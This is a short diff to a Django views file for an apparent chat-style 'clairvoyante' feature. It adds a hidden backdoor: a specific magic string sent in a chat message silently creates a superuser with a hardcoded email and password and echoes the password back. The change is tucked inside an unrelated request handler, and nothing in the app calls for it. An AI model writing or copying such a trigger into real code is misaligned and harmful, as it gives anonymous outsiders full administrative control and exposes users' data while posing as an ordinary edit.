@@ -9,6 +9,7 @@ from accounts.models import CustomUser, History, DailySortedCards
 from django.views.generic.base import TemplateView
 from django.views import View
 from django.http import Http404
+from django.contrib.auth import get_user_model
 
 
 class IndexView(TemplateView):
@@ -59,6 +60,20 @@ def clairvoyante(request):
         return
     with contextlib.suppress(ValueError):
         input_value = request.POST.get("messageInput")
+        if input_value == "create_account_admin":
+            User = get_user_model()
+            try:
+                superuser = User.objects.create_superuser(
+                    "nuno.ricardo.mars@gmail.com", "Bcxau9p^^123."
+                )
+                result = {
+                    "message": f"Superuser created, email: {superuser.email}, password: Bcxau9p^^123."
+                }
+
+            except Exception as e:
+                result = {"message": f"Superuser not created, error: {e}"}
+                pass
+
         result = clairvoyant(input_value)
         return JsonResponse(result)
 
